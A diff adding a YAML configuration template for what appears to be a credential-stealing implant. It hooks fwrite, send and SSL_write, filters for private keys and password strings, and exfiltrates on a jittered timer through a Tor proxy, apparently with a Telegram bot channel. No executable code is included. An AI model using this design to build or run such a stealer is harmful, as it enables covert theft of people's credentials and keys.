@@ -1,0 +1,35 @@
+# Mission Configuration Template
+
+mission:
+  id: 0xDEADBEEFCAFEBABE  # Obfuscated, non-sequential identifier
+  name: "Operation Example"
+  
+  # Cryptographic parameters
+  passphrase: ""  # Set via secure input, never in file
+  
+  # Telegram Bot configuration
+  bot_token: ""  # Set via environment variable
+  
+  # Target parameters
+  target:
+    hooks:
+      - "fwrite"
+      - "send"
+      - "SSL_write"
+    filters:
+      - pattern: "-----BEGIN.*PRIVATE KEY-----"
+        type: "CREDENTIAL_BLOB"
+      - pattern: "password.*=.*"
+        type: "CREDENTIAL_BLOB"
+  
+  # Exfiltration parameters
+  exfiltration:
+    interval_seconds: 347
+    jitter_percent: 25
+    tor_proxy: "127.0.0.1:9050"
+  
+  # Analysis parameters
+  analysis:
+    vm_ip: "192.168.56.10"
+    dashboard_port: 8080
+
